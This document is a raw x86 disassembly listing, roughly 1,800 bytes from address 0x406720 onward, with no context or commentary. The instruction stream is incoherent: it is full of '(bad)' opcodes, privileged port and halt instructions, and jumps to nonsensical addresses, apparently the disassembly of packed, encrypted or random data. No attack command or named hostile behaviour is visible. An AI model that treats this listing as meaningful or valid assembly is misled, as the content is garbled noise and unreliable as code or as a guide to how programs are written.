  406720:	pop    es
  406721:	in     eax,dx
  406722:	in     eax,dx
  406723:	cmp    dh,BYTE PTR [edi]
  406725:	mov    ds,ecx
  406727:	mov    bh,0xf4
  406729:	out    0xd,al
  40672b:	mul    BYTE PTR [ecx-0x1d]
  40672e:	hlt    
  40672f:	xchg   DWORD PTR [ecx+0x32],edx
  406732:	daa    
  406733:	sub    al,BYTE PTR [edx+eax*2]
  406736:	aam    0xcb
  406738:	inc    edx
  406739:	rcr    DWORD PTR [ebp+0x50],cl
  40673c:	sub    ecx,DWORD PTR [ecx-0x6e777d48]
  406742:	loop   0x40672c
  406744:	and    esi,0xffffffa4
  406747:	xchg   esp,eax
  406748:	les    edi,FWORD PTR [edx+0x2a]
  40674b:	push   ebx
  40674c:	or     esi,DWORD PTR [eax]
  40674e:	add    ebp,DWORD PTR [ebx+eiz*2]
  406751:	push   es
  406752:	imul   ecx,DWORD PTR ds:0x8f5d3ba4,0xe
  406759:	or     BYTE PTR [ebx],al
  40675b:	sbb    BYTE PTR [esi-0x5cc31129],bl
  406761:	mul    DWORD PTR [ecx]
  406763:	pop    ebp
  406764:	xchg   esp,eax
  406765:	jl     0x406780
  406767:	inc    eax
  406768:	scas   eax,DWORD PTR es:[edi]
  406769:	std    
  40676a:	fnstcw WORD PTR [ebx+0xae02718]
  406770:	add    edx,esi
  406772:	sbb    eax,0x72037be6
  406777:	les    ecx,FWORD PTR [ebp+0x7e3109fa]
  40677d:	jmp    0x4a8678b1
  406782:	or     bl,cl
  406784:	test   al,0x9f
  406786:	or     DWORD PTR [edi+0x58ba424],edi
  40678c:	(bad)  
  40678e:	sub    al,0xb3
  406790:	cld    
  406791:	loopne 0x40675c
  406793:	xchg   ebx,eax
  406794:	pop    ss
  406795:	or     al,0x6
  406797:	inc    ebx
  406798:	xchg   esp,eax
  406799:	push   0x229fa3d8
  40679e:	nop
  40679f:	in     al,0xf4
  4067a1:	dec    ecx
  4067a2:	xchg   DWORD PTR [edi+0x78ada6e5],eax
  4067a8:	je     0x4067d9
  4067aa:	dec    ebp
  4067ab:	cmp    DWORD PTR ds:0xe5e5896d,esi
  4067b1:	test   DWORD PTR [edx],esp
  4067b3:	int    0x7e
  4067b5:	jmp    0xfbed5819
  4067ba:	xor    eax,0xa84fb9a7
  4067bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067c0:	jecxz  0x4067d2
  4067c2:	pop    ecx
  4067c3:	sbb    BYTE PTR [eax],cl
  4067c5:	in     al,dx
  4067c6:	xor    eax,0x6ece30ac
  4067cb:	test   DWORD PTR [eax],ecx
  4067cd:	call   0xae8a7323
  4067d2:	loope  0x406803
  4067d4:	out    0xb9,al
  4067d6:	adc    BYTE PTR [ecx],bh
  4067d8:	xor    esi,edx
  4067da:	push   0x6c
  4067dc:	or     al,0x86
  4067de:	dec    esp
  4067df:	dec    ecx
  4067e0:	or     edi,edi
  4067e2:	call   0x7e9e:0x81b583c7
  4067e9:	and    ebp,DWORD PTR [ebx]
  4067eb:	push   es
  4067ec:	inc    ecx
  4067ed:	inc    eax
  4067ee:	inc    esp
  4067ef:	icebp  
  4067f0:	outs   dx,DWORD PTR ds:[esi]
  4067f1:	sbb    al,0x4b
  4067f3:	(bad)  
  4067f4:	xor    ebx,DWORD PTR [edx+0x7c]
  4067f7:	fst    DWORD PTR [edi]
  4067f9:	jge    0x406823
  4067fb:	les    edi,FWORD PTR ds:0x70d53d8f
  406801:	fucomip st,st(3)
  406803:	inc    edx
  406804:	mov    ecx,0xcae212c8
  406809:	xchg   esi,eax
  40680a:	xor    eax,0x72282daa
  40680f:	push   ss
  406810:	xchg   ebp,eax
  406811:	and    al,BYTE PTR [esp+eax*1-0x2b]
  406815:	dec    esi
  406816:	add    eax,0xd85f2b4
  40681b:	xchg   DWORD PTR [edi-0xe],eax
  40681e:	xchg   ecx,eax
  40681f:	scas   al,BYTE PTR es:[edi]
  406820:	shl    ah,1
  406822:	frstor [esi-0x6a3ccd84]
  406828:	les    esi,FWORD PTR [esi]
  40682a:	pop    esp
  40682b:	cs ds dec ecx
  40682e:	cdq    
  40682f:	sbb    dh,ch
  406831:	xor    eax,0xf6c066c8
  406836:	xor    eax,0xfc5f01e9
  40683b:	ins    DWORD PTR es:[edi],dx
  40683c:	mov    edi,0xf7caeca
  406841:	aam    0x6e
  406843:	jl     0x40682a
  406845:	mov    eax,ds:0x3594b86a
  40684a:	xchg   ecx,edx
  40684c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40684d:	hlt    
  40684e:	mov    ecx,0x89ecc509
  406853:	gs jmp 0x40686c
  406856:	sbb    BYTE PTR [esi+0x68],dl
  406859:	xchg   esp,eax
  40685a:	sar    DWORD PTR [ebp+0x25b2e978],0x5c
  406861:	inc    ebx
  406862:	add    ebp,edi
  406864:	retf   0xc76e
  406867:	adc    dl,BYTE PTR [eax]
  406869:	inc    esi
  40686a:	push   cs
  40686b:	jns    0x4068a5
  40686d:	es daa 
  40686f:	xchg   ebx,eax
  406870:	jae    0x40681a
  406872:	mov    eax,ds:0x1b15b1b3
  406877:	ins    DWORD PTR es:[edi],dx
  406878:	cwde   
  406879:	int3   
  40687a:	imul   edi,ebx,0xffffffeb
  40687d:	fistp  QWORD PTR [esi+0x35]
  406880:	and    cl,dl
  406882:	neg    BYTE PTR [edi]
  406884:	pop    edx
  406885:	out    dx,eax
  406886:	mov    dh,0x94
  406888:	cmc    
  406889:	lods   eax,DWORD PTR ds:[esi]
  40688a:	dec    ecx
  40688b:	cld    
  40688c:	jge    0x406879
  40688e:	jb     0x406899
  406890:	inc    eax
  406891:	sar    DWORD PTR cs:[ecx],1
  406894:	adc    DWORD PTR [edx],edi
  406896:	mov    eax,0x22af0556
  40689c:	dec    esi
  40689d:	aam    0xc1
  40689f:	jbe    0x4068e4
  4068a1:	jnp    0x406899
  4068a3:	adc    ecx,eax
  4068a5:	jo     0x4068e8
  4068a7:	push   esp
  4068a8:	sub    eax,esi
  4068aa:	dec    esp
  4068ab:	pop    ss
  4068ac:	(bad)  
  4068ad:	push   ds
  4068ae:	cli    
  4068af:	dec    edx
  4068b0:	cdq    
  4068b1:	mov    ah,0x65
  4068b3:	lock pop edi
  4068b5:	popa   
  4068b6:	mov    al,ds:0x56a07eb3
  4068bb:	pop    es
  4068bc:	xchg   esi,eax
  4068bd:	repnz data16 rol BYTE PTR [edx-0x3f],1
  4068c2:	retf   
  4068c3:	in     al,dx
  4068c4:	mov    ds:0x4f969b24,al
  4068c9:	add    al,0xd5
  4068cb:	ins    BYTE PTR es:[edi],dx
  4068cc:	sub    DWORD PTR ds:0x7bbe8e9,0xffffff8d
  4068d3:	sub    DWORD PTR [edx-0x36],ecx
  4068d6:	pusha  
  4068d7:	cmp    al,0xc0
  4068d9:	adc    esi,DWORD PTR [esi-0x23b65c6]
  4068df:	pop    edx
  4068e0:	adc    bl,BYTE PTR ds:0x6fb5fafa
  4068e6:	xchg   ebp,eax
  4068e7:	adc    eax,DWORD PTR [ecx+eax*8-0xf]
  4068eb:	sbb    esp,DWORD PTR [ebx+0x3c]
  4068ee:	adc    ebp,esi
  4068f0:	and    al,0x2e
  4068f2:	jl     0x406950
  4068f4:	imul   DWORD PTR [ebx]
  4068f6:	inc    esp
  4068f7:	push   ecx
  4068f8:	test   eax,0xf028377c
  4068fd:	or     eax,DWORD PTR [ebp+0x2b]
  406900:	jge    0x4068d4
  406902:	add    al,0x78
  406904:	sbb    DWORD PTR [edx-0x3d],esi
  406907:	pop    esp
  406908:	push   0x8fe98084
  40690d:	fwait
  40690e:	or     ebp,DWORD PTR [ebx+0x2ee7aaac]
  406914:	nop
  406915:	lahf   
  406916:	mov    ebp,0x4e7f407a
  40691b:	inc    esp
  40691c:	rol    DWORD PTR [esi],0x91
  40691f:	retf   0x1baf
  406922:	push   esp
  406923:	sti    
  406924:	scas   al,BYTE PTR es:[edi]
  406925:	(bad)  
  406926:	mov    bl,0x4b
  406928:	iret   
  406929:	xchg   esi,eax
  40692a:	sub    al,0x47
  40692c:	bound  edx,QWORD PTR [edi+0x24af13cb]
  406932:	mov    esp,0x476a1cf8
  406937:	pop    DWORD PTR [ecx+0x6d]
  40693a:	pop    esi
  40693b:	add    edi,DWORD PTR ds:0x92cb17ff
  406941:	ds fwait
  406943:	mov    BYTE PTR [ebx+0x11],0x8f
  406947:	pop    edx
  406948:	jae    0x40694b
  40694a:	mov    ebx,0x8d36dd2
  40694f:	mov    bh,0xd6
  406951:	fs test al,0x38
  406954:	or     edx,esp
  406956:	mov    dh,0xf3
  406958:	push   eax
  406959:	jns    0x4069b9
  40695b:	push   es
  40695c:	and    eax,DWORD PTR [edi]
  40695e:	inc    eax
  40695f:	jo     0x406959
  406961:	or     BYTE PTR [ebp+0x718aaa4],bh
  406967:	stos   BYTE PTR es:[edi],al
  406968:	push   cs
  406969:	fs pop esi
  40696b:	push   eax
  40696c:	inc    ebp
  40696d:	ret    0x2819
  406970:	inc    esi
  406971:	mov    ch,0xf4
  406973:	jo     0x4069e1
  406975:	pop    ax
  406977:	scas   al,BYTE PTR es:[edi]
  406978:	xor    dl,BYTE PTR [ebx-0x26956be1]
  40697e:	xor    al,0xb9
  406980:	stc    
  406981:	into   
  406982:	stc    
  406983:	aas    
  406984:	add    DWORD PTR [ecx-0x7111cfff],0xffffff93
  40698b:	out    dx,eax
  40698c:	lods   eax,DWORD PTR ds:[esi]
  40698d:	mov    ds:0x77c7f5d7,al
  406992:	pop    ebp
  406993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406994:	add    BYTE PTR [ebx-0x4ddab86e],0x2d
  40699b:	push   edi
  40699c:	inc    esi
  40699d:	stos   BYTE PTR es:[edi],al
  40699e:	mov    dl,0x7c
  4069a0:	lods   eax,DWORD PTR es:[esi]
  4069a2:	push   ebp
  4069a3:	sbb    BYTE PTR ds:0x6cbd4c4d,cl
  4069a9:	inc    ebp
  4069aa:	test   BYTE PTR [ecx+0x4e5263b0],ch
  4069b0:	xlat   BYTE PTR ds:[ebx]
  4069b1:	sahf   
  4069b2:	bnd jo 0x406a2b
  4069b5:	shl    DWORD PTR [ebx+0x45],cl
  4069b8:	mov    ch,0x99
  4069ba:	and    eax,0x1ef2a71f
  4069bf:	add    edx,0xaf21675b
  4069c5:	scas   al,BYTE PTR es:[edi]
  4069c6:	lods   eax,DWORD PTR ds:[esi]
  4069c7:	rcr    DWORD PTR [edi+0x4a],1
  4069ca:	push   cs
  4069cb:	or     edi,DWORD PTR [ecx+0x1d6f6107]
  4069d1:	fbld   TBYTE PTR [edi+0x63]
  4069d4:	sbb    eax,eax
  4069d6:	ror    BYTE PTR [edx-0x17b716a1],cl
  4069dc:	push   ds
  4069dd:	(bad)  
  4069de:	test   DWORD PTR [ebx-0x6fad1033],0x6db0b648
  4069e8:	(bad)  
  4069e9:	popf   
  4069ea:	mov    edi,0xcd7476bc
  4069ef:	sbb    eax,0xcee064d8
  4069f4:	leave  
  4069f5:	pop    ds
  4069f6:	shl    esp,cl
  4069f8:	xchg   dh,dh
  4069fa:	xchg   ebp,eax
  4069fb:	into   
  4069fc:	leave  
  4069fd:	push   eax
  4069fe:	jmp    0x37bb200c
  406a03:	(bad)  
  406a06:	int    0x3e
  406a08:	int    0x8d
  406a0a:	or     DWORD PTR [edi+0x136859f7],edx
  406a10:	cli    
  406a11:	cli    
  406a12:	jb     0x4069d2
  406a14:	hlt    
  406a15:	xchg   edi,eax
  406a16:	push   esp
  406a17:	xor    DWORD PTR [ecx-0x3e],ebp
  406a1a:	sbb    BYTE PTR [ebx-0x27],0x4c
  406a1e:	(bad)  
  406a1f:	and    BYTE PTR [ebp+0x7],al
  406a22:	fild   WORD PTR ds:0x635d16a1
  406a28:	outs   dx,DWORD PTR ds:[esi]
  406a29:	pop    ss
  406a2a:	gs fcmove st,st(6)
  406a2d:	ins    DWORD PTR es:[edi],dx
  406a2e:	test   al,0xcc
  406a30:	push   cs
  406a31:	in     eax,0x3b
  406a33:	clc    
  406a34:	mov    dl,0x1d
  406a36:	lock fwait
  406a38:	cmp    DWORD PTR [ecx+0x7bc7381c],esp
  406a3e:	ins    DWORD PTR es:[edi],dx
  406a3f:	stos   BYTE PTR es:[edi],al
  406a40:	mov    cl,0xd3
  406a42:	enter  0xb4fd,0xfe
  406a46:	int3   
  406a47:	or     DWORD PTR [eax],ebx
  406a49:	ret    0xbcf1
  406a4c:	xchg   edi,eax
  406a4d:	jne    0x406a9c
  406a4f:	sub    ebp,DWORD PTR [esi]
  406a51:	fidivr WORD PTR [ebx+esi*4-0x10cf3219]
  406a58:	clc    
  406a59:	fisub  DWORD PTR [esi+0xb]
  406a5c:	(bad)  
  406a5d:	test   DWORD PTR [eax+0x1ebbbb5c],0xe8ba511c
  406a67:	and    al,0x2a
  406a69:	loop   0x406a52
  406a6b:	test   al,0xab
  406a6d:	lods   eax,DWORD PTR ds:[esi]
  406a6e:	or     eax,0x44553906
  406a73:	mul    BYTE PTR [edi-0x2e]
  406a76:	test   al,0xd0
  406a78:	(bad)  
  406a79:	mov    cl,0x28
  406a7b:	xor    al,0xfe
  406a7d:	jne    0x406a25
  406a7f:	inc    eax
  406a80:	stos   DWORD PTR es:[edi],eax
  406a81:	jae    0x406a83
  406a83:	clc    
  406a84:	lea    ecx,[esp+edi*4+0x6e]
  406a88:	test   al,0x47
  406a8a:	mov    ch,BYTE PTR [ebp+0x39824da9]
  406a90:	loope  0x406a7e
  406a92:	adc    dh,dl
  406a94:	outs   dx,BYTE PTR ds:[esi]
  406a95:	xor    eax,0x6fd9d5ab
  406a9a:	or     ebp,DWORD PTR [esp+ecx*2+0x711ecc70]
  406aa1:	loopne 0x406b01
  406aa3:	add    BYTE PTR [eax+0x294bb7c4],ch
  406aa9:	add    esi,esp
  406aab:	or     al,0x54
  406aad:	scas   eax,DWORD PTR es:[edi]
  406aae:	dec    ebp
  406aaf:	or     BYTE PTR [eax],ah
  406ab1:	sub    ebx,edi
  406ab3:	or     cl,BYTE PTR [edx+0x60]
  406ab6:	sub    BYTE PTR ds:0xeee23393,0xf8
  406abd:	dec    ebx
  406abe:	sahf   
  406abf:	dec    edx
  406ac0:	pop    esi
  406ac1:	aaa    
  406ac2:	jl     0x406af9
  406ac4:	push   esp
  406ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ac6:	mov    bl,0x83
  406ac8:	int    0x3f
  406aca:	fadd   DWORD PTR ds:0xe32e3958
  406ad0:	jp     0x406af9
  406ad2:	pop    eax
  406ad3:	push   eax
  406ad4:	push   ss
  406ad5:	sbb    DWORD PTR [edi],0x12
  406ad8:	and    dl,BYTE PTR ds:0x93ad2d73
  406ade:	cmp    al,0x6f
  406ae0:	sbb    BYTE PTR [ebx],dh
  406ae2:	add    eax,0x7285d90
  406ae7:	jecxz  0x406ad0
  406ae9:	stos   DWORD PTR es:[edi],eax
  406aea:	jbe    0x406ac1
  406aec:	sub    eax,0xd6d923be
  406af1:	out    dx,eax
  406af2:	dec    ebp
  406af3:	aad    0x99
  406af5:	je     0x406a78
  406af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406af8:	pop    ds
  406af9:	add    al,BYTE PTR [esi+0x689a0f0d]
  406aff:	leave  
  406b00:	and    BYTE PTR [ecx],bl
  406b02:	or     BYTE PTR [esp+edx*2+0x7f3b5c2b],ch
  406b09:	lds    eax,FWORD PTR [edx+0x6]
  406b0c:	loopne 0x406ae8
  406b0e:	je     0x406b8e
  406b10:	stc    
  406b11:	shr    BYTE PTR [eax-0x32],1
  406b14:	or     ecx,DWORD PTR [ecx+0x37]
  406b17:	(bad)  
  406b18:	fld    TBYTE PTR [esi+0x4]
  406b1b:	ja     0x406b8a
  406b1d:	inc    ebp
  406b1e:	xlat   BYTE PTR ds:[ebx]
  406b1f:	sub    edi,DWORD PTR [edi-0x51]
  406b22:	test   al,0xa3
  406b24:	mov    bh,0x33
  406b26:	push   edx
  406b27:	sbb    DWORD PTR [ecx+0x1ea4987c],ebp
  406b2d:	push   ds
  406b2e:	sbb    DWORD PTR [ecx-0x4e9c4461],edi
  406b34:	f2xm1  
  406b36:	std    
  406b37:	and    DWORD PTR [ecx-0x5572369a],ebx
  406b3d:	pop    edi
  406b3e:	jb     0x406b25
  406b40:	add    al,0xf2
  406b42:	add    eax,0xfc5a7faf
  406b47:	pop    ss
  406b48:	and    al,0x32
  406b4a:	mov    ch,BYTE PTR [edx+0xc0866e5]
  406b50:	adc    BYTE PTR [esi+edi*4-0x23fa30f],ah
  406b57:	add    esp,DWORD PTR [eax-0x4e]
  406b5a:	mov    ch,0x9c
  406b5c:	sti    
  406b5d:	loope  0x406ae3
  406b5f:	std    
  406b60:	push   ebp
  406b61:	popa   
  406b62:	mov    edx,0x958a05a8
  406b67:	inc    edx
  406b68:	xchg   ebp,eax
  406b69:	push   es
  406b6a:	sbb    bh,BYTE PTR [edi-0x398014bf]
  406b70:	mov    ebx,0x8a4525f1
  406b75:	test   BYTE PTR [edx-0x339952c6],cl
  406b7b:	aas    
  406b7c:	mov    edx,0xe73f84ff
  406b81:	adc    al,0x6a
  406b83:	dec    esi
  406b84:	pop    ebx
  406b85:	pusha  
  406b86:	nop
  406b87:	xchg   edi,eax
  406b88:	ret    
  406b89:	mov    eax,esi
  406b8b:	cwde   
  406b8c:	stos   DWORD PTR es:[edi],eax
  406b8d:	ficom  DWORD PTR [ebp+0x4f]
  406b90:	inc    edi
  406b91:	xor    ecx,DWORD PTR [ebx]
  406b93:	gs mov eax,0x651949fb
  406b99:	push   0x39
  406b9b:	mov    dl,0x74
  406b9d:	in     eax,0x33
  406b9f:	sahf   
  406ba0:	or     edi,DWORD PTR [ebx+0x390bcf55]
  406ba6:	data16 shr BYTE PTR [ecx-0x4aa3f198],cl
  406bad:	mov    bl,BYTE PTR [edx]
  406baf:	cmp    eax,0x79465ed1
  406bb4:	push   ds
  406bb5:	jbe    0x406c11
  406bb7:	test   DWORD PTR [esi+0xa],eax
  406bba:	retf   
  406bbb:	xor    al,BYTE PTR [eax]
  406bbd:	call   0x34f660af
  406bc2:	adc    al,0xda
  406bc4:	cmp    dl,BYTE PTR [ebx]
  406bc6:	jl     0x406bec
  406bc8:	imul   ecx,edi,0xffffffcd
  406bcb:	shl    ch,1
  406bcd:	mov    ds:0x70134624,al
  406bd2:	sbb    al,0x5a
  406bd4:	clc    
  406bd5:	mov    al,0x22
  406bd7:	xor    al,bl
  406bd9:	jle    0x406c26
  406bdb:	js     0x406b95
  406bdd:	inc    esi
  406bde:	es call eax
  406be1:	iret   
  406be2:	xor    esp,DWORD PTR ds:[eax+ebp*2+0x71]
  406be7:	out    dx,eax
  406be8:	xchg   edx,eax
  406be9:	imul   ecx,edx,0xf
  406bec:	loop   0x406bac
  406bee:	daa    
  406bef:	mov    al,ds:0x549311a9
  406bf4:	sahf   
  406bf5:	push   0xb693eae0
  406bfa:	xchg   cl,bh
  406bfc:	aas    
  406bfd:	add    edx,DWORD PTR ss:[ebp-0x6d40e93f]
  406c04:	mov    al,0xf7
  406c06:	das    
  406c07:	clc    
  406c08:	push   ebp
  406c09:	dec    edx
  406c0a:	test   BYTE PTR [esi+0xc974be4],ah
  406c10:	cdq    
  406c11:	inc    edi
  406c12:	push   esi
  406c13:	jl     0x406bd1
  406c15:	popf   
  406c16:	pusha  
  406c17:	xchg   dl,dl
  406c19:	je     0x406bd8
  406c1b:	(bad)  
  406c1c:	mov    ds:0x9d46bcdf,eax
  406c21:	sahf   
  406c22:	icebp  
  406c23:	pusha  
  406c24:	rol    DWORD PTR [ebp+0x64643c98],1
  406c2a:	int    0xd4
  406c2c:	lods   eax,DWORD PTR ds:[esi]
  406c2d:	imul   DWORD PTR [edx]
  406c2f:	adc    esp,DWORD PTR [ebp+0x35]
  406c32:	(bad)  
  406c33:	push   edi
  406c34:	xchg   esp,eax
  406c35:	les    esi,FWORD PTR [ebp+0x43b57045]
  406c3b:	shl    BYTE PTR [edx-0x7c],0x64
  406c3f:	xchg   edx,eax
  406c40:	fs inc eax
  406c42:	arpl   WORD PTR [ecx+0x7d],cx
  406c45:	add    al,BYTE PTR [edx]
  406c47:	dec    eax
  406c48:	or     BYTE PTR [edi],0x39
  406c4b:	std    
  406c4c:	das    
  406c4d:	retf   
  406c4e:	out    0xb9,al
  406c50:	inc    esi
  406c51:	push   ebp
  406c52:	xor    al,0xb5
  406c54:	or     dl,BYTE PTR [eax-0x5c0d9355]
  406c5a:	jns    0x406c23
  406c5c:	push   edi
  406c5d:	dec    edi
  406c5e:	aad    0xe6
  406c60:	sbb    BYTE PTR [eax+0x3e49986f],cl
  406c66:	sub    edi,DWORD PTR [ebx-0x769fe07]
  406c6c:	fs ds mov esp,0x8a32902b
  406c73:	pop    esp
  406c74:	xlat   BYTE PTR ds:[ebx]
  406c75:	shr    BYTE PTR [ecx+edi*1],cl
  406c78:	stc    
  406c79:	arpl   WORD PTR [edx-0x2c],ax
  406c7c:	jnp    0x406c2d
  406c7e:	jne    0x406cd1
  406c80:	push   0x361fd1f
  406c85:	xor    dh,BYTE PTR [ebp+0x7a9c783b]
  406c8b:	cli    
  406c8c:	test   BYTE PTR [ecx],al
  406c8e:	loope  0x406cb5
  406c90:	cmp    al,0x93
  406c92:	call   DWORD PTR [edx]
  406c94:	clc    
  406c95:	(bad)  
  406c96:	push   ebx
  406c97:	inc    esi
  406c98:	jno    0x406c40
  406c9a:	fild   WORD PTR [esi-0x30]
  406c9d:	pop    ss
  406c9e:	xchg   edi,eax
  406c9f:	out    dx,al
  406ca0:	and    DWORD PTR [esi],0xfffffff4
  406ca3:	mov    esi,0x7ec24975
  406ca8:	pop    eax
  406ca9:	arpl   WORD PTR ds:0x4ae3e49b,dx
  406caf:	jge    0x406c63
  406cb1:	jae    0x406c34
  406cb3:	shl    BYTE PTR ds:0xcac0c2f8,0xc0
  406cba:	push   edi
  406cbb:	lods   eax,DWORD PTR ds:[esi]
  406cbc:	enter  0x9c9f,0xcb
  406cc0:	and    DWORD PTR [ebx],ebx
  406cc2:	loope  0x406c7a
  406cc4:	stos   BYTE PTR es:[edi],al
  406cc5:	fs push ecx
  406cc7:	loop   0x406cff
  406cc9:	jnp    0x406c85
  406ccb:	xchg   BYTE PTR [eax+0x63ea90bf],bh
  406cd1:	adc    al,0x70
  406cd3:	popf   
  406cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd5:	stos   DWORD PTR es:[edi],eax
  406cd6:	xchg   DWORD PTR [ebx+0x5599f714],ecx
  406cdc:	dec    ecx
  406cdd:	push   esi
  406cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cdf:	inc    esp
  406ce0:	fdiv   DWORD PTR [edi-0x6ca12467]
  406ce6:	adc    DWORD PTR [edx+0x615701d3],edi
  406cec:	push   ebp
  406ced:	mov    cl,al
  406cef:	sbb    esi,DWORD PTR [ebx]
  406cf1:	mov    ch,0x10
  406cf3:	push   ss
  406cf4:	push   edx
  406cf5:	stos   DWORD PTR es:[edi],eax
  406cf6:	xchg   ebp,eax
  406cf7:	in     al,dx
  406cf8:	jno    0x406c85
  406cfa:	adc    DWORD PTR [edi-0x63],ebx
  406cfd:	pop    ebx
  406cfe:	xor    esi,ebx
  406d00:	aam    0x9e
  406d02:	mov    DWORD PTR [edi+eax*4],esp
  406d05:	xchg   dh,bl
  406d07:	mov    bl,0x19
  406d09:	std    
  406d0a:	lock xor DWORD PTR [ecx],esi
  406d0d:	push   0x1f5ca93b
  406d12:	ja     0x406d64
  406d14:	ins    BYTE PTR es:[edi],dx
  406d15:	pop    eax
  406d16:	push   esi
  406d17:	jns    0x406d40
  406d19:	push   0xffffffed
  406d1b:	mov    bh,0xb2
  406d1d:	push   ss
  406d1e:	fs dec eax
  406d20:	mov    ds:0x67662807,al
  406d26:	xor    al,0x56
  406d28:	sbb    ebx,DWORD PTR ds:0x1ea3583a
  406d2e:	and    eax,0x89e0c4c7
  406d33:	mov    edx,0x9519b761
  406d38:	loop   0x406cc8
  406d3a:	jno    0x406d5a
  406d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d3d:	xchg   edx,eax
  406d3e:	mov    ds,ebx
  406d40:	sbb    dh,BYTE PTR [esi+ecx*4]
  406d43:	ret    0x87e5
  406d46:	inc    edi
  406d47:	sar    DWORD PTR [edi+ebp*1-0x4b],0x29
  406d4c:	cmp    DWORD PTR [ebx-0x4e],0xffffffef
  406d50:	jb     0x406db9
  406d52:	and    DWORD PTR [ebx],0x3b833594
  406d58:	mov    ebx,0x90b92c69
  406d5d:	sub    ebp,DWORD PTR [edi-0x7]
  406d60:	xchg   ebx,ebp
  406d62:	fisttp DWORD PTR [esi]
  406d64:	mov    ds:0xfe439f8f,al
  406d69:	push   edi
  406d6a:	and    DWORD PTR [ecx],0x4d
  406d6d:	(bad)  
  406d6e:	in     eax,dx
  406d6f:	xor    cl,bl
  406d71:	out    dx,al
  406d72:	or     eax,0x769bb1bb
  406d77:	mov    ch,0x55
  406d79:	sar    DWORD PTR [ebx+ecx*1+0x2e],1
  406d7d:	cld    
  406d7e:	pop    eax
  406d7f:	mov    esi,DWORD PTR [ecx-0x33]
  406d82:	in     al,0x80
  406d84:	push   ss
  406d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d86:	lds    esi,FWORD PTR [edx-0x243a609]
  406d8c:	arpl   bp,si
  406d8e:	scas   eax,DWORD PTR es:[edi]
  406d8f:	daa    
  406d90:	daa    
  406d91:	clc    
  406d92:	sbb    BYTE PTR [ebx+0x27],ch
  406d95:	pop    esi
  406d96:	test   edi,ebp
  406d98:	mov    bl,0x9
  406d9a:	int3   
  406d9b:	jns    0x406dc9
  406d9d:	and    ah,BYTE PTR [esi]
  406d9f:	(bad)  
  406da0:	shl    edx,1
  406da2:	mov    ebx,0x3d7313cd
  406da7:	lea    edi,[edi]
  406da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406daa:	xor    al,0xda
  406dac:	ja     0x406e0f
  406dae:	shl    DWORD PTR [eax+0x1d],1
  406db1:	dec    esi
  406db2:	fldenv [edx-0x2b]
  406db5:	stc    
  406db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406db8:	cli    
  406db9:	push   cs
  406dba:	gs mov ch,0x67
  406dbd:	push   0xfffffffc
  406dbf:	shl    DWORD PTR [eax-0x15],1
  406dc2:	and    ecx,ebp
  406dc4:	and    cl,bh
  406dc6:	inc    ecx
  406dc7:	mov    ds:0x29b88d19,eax
  406dcc:	(bad)  
  406dcd:	fnstsw WORD PTR [ecx+0x21792524]
  406dd3:	outs   dx,BYTE PTR ds:[esi]
  406dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dd5:	enter  0x8917,0x4a
  406dd9:	sbb    dl,bl
  406ddb:	sti    
  406ddc:	std    
  406ddd:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  406ddf:	pusha  
  406de0:	xchg   edi,eax
  406de1:	jle    0x406e38
  406de3:	arpl   WORD PTR [eax+0x2a],dx
  406de6:	ret    0xaf9e
  406de9:	push   eax
  406dea:	aad    0xb
  406dec:	pop    eax
  406ded:	sar    WORD PTR [ecx],0x18
  406df1:	ds inc eax
  406df3:	add    eax,0x1d8d8d7c
  406df8:	(bad)  
  406df9:	ret    
  406dfa:	into   
  406dfb:	fist   WORD PTR [ebp+0x1d2f7bb5]
  406e01:	ret    
  406e02:	and    esi,eax
  406e04:	jne    0x406e40
  406e06:	jmp    0xf545eadf
  406e0b:	pop    edi
  406e0c:	mov    dh,0x37
  406e0e:	adc    DWORD PTR ds:0xe72916a5,edi
  406e14:	cmp    ebx,DWORD PTR [eax]
  406e16:	mov    ecx,0xbcc448c4
  406e1b:	addr16 dec esp
  406e1d:	jp     0x406de9
  406e1f:	xchg   edx,eax
  406e20:	push   esp
  406e21:	fcmove st,st(3)
  406e23:	call   0xb6346441
  406e28:	or     bl,BYTE PTR [ebx]
  406e2a:	addr16 imul ebx,ecx,0x4b648bf1
  406e31:	lock pop esi
  406e33:	jle    0x406e67
  406e35:	jle    0x406e04
  406e37:	sbb    bl,BYTE PTR [ebx-0x62b91f7a]
  406e3d:	iret   
  406e3e:	into   
  406e3f:	call   0xae97:0x660a9645
  406e46:	inc    edi
  406e47:	jmp    0x406ea6
  406e49:	inc    ebx
  406e4a:	aam    0xf1
  406e4c:	imul   esi,DWORD PTR [eax-0x5514e027],0x554325ec
  406e56:	pop    ebx
  406e57:	mov    DWORD PTR [ebp-0x1c],ebx
  406e5a:	popa   
  406e5b:	fwait
  406e5c:	jg     0x406e08
  406e5e:	xchg   DWORD PTR [ebx+ebx*8+0x38],edx
  406e62:	push   0xbdec3b2d
  406e67:	add    BYTE PTR [edi],bl
  406e69:	pop    ebp
  406e6a:	inc    ecx
  406e6b:	mov    edi,DWORD PTR [esi+edi*8-0x5d3d74cb]
  406e72:	adc    eax,0x29f37ca2
  406e77:	lods   eax,DWORD PTR ds:[esi]
  406e78:	arpl   WORD PTR [ecx+0x6d],sp
  406e7b:	inc    edx
  406e7c:	push   ds
  406e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7e:	dec    edi
  406e7f:	inc    eax
  406e80:	cmc    
  406e81:	jl     0x406e22
  406e83:	loop   0x406e15
  406e85:	mov    dh,0x3b
  406e87:	and    esp,DWORD PTR [ebx-0x6b18168f]
  406e8d:	lea    ecx,[ecx+0x114ac80]
  406e93:	or     BYTE PTR [ebx+0x46535c42],0x97
  406e9a:	push   esp
